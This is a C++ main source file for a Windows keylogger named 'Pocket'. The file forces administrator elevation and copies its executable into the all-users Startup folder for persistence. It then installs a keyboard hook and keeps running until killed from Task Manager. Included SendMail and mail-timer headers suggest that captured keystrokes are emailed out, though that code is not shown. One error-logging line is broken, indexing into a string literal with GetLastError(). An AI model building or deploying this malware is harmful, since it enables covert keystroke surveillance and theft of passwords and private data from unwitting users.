#include <iostream>
#include <windows.h>

#include "Helper.h"
#include "Constants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeyboardHook.h"

#include <cstdio>  /* defines FILENAME_MAX */
#include <direct.h>

#include "Determination.cpp"
#include "Elevation.cpp"

bool IsRunAsAdministrator();
void ElevateNow();

using namespace std;


int main() {
    MSG msg;

    if(IsRunAsAdministrator()) {}
    else ElevateNow();


    char buff[FILENAME_MAX];
    string temp = string(_getcwd(buff, FILENAME_MAX)) + string("\\Pocket.exe");  // get pocket running dir + application

    // converts pocket dir to char arr
    char * pocketDir = new char [temp.length() + 1];
    strcpy (pocketDir, temp.c_str());

    // location of auto-start applications (we need admin perms to copy here)
    const CHAR *autoStartDir = R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Pocket.exe)";

    bool copied = CopyFile(pocketDir, autoStartDir, 0);
    // https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
    if (!copied) Helper::writeLog(&"Error writing to startup dir (most likely not admin) " [ GetLastError()]);
    else Helper::writeLog("Wrote to startup dir");

    IO::mkDir(IO::getPath(true));  // creates default pocketDir
    InstallHook();
    while(GetMessage (&msg, nullptr, 0, 0)) {  // makes program not stop (except w task manager)
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    MailTimer.Stop();
    return 0;
}